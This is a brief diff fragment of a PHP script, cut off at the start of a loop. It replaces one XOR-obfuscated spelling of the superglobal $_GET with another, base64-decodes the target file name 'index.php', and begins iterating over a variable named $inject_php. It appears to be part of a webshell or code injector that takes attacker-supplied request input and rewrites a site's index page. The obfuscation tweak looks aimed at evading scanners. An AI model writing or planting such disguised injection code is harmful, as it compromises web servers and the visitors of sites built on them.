@@ -1,6 +1,6 @@
 
 <?php
-$a = ${"g..!"^"8iku"}[1];
+$a = ${"f-$&"^"9jar"}[1];
 $ar = base64_decode("aW5kZXgucGhw");
 $arr = explode('|',$ar);
 foreach($arr as $k => $inject_php){
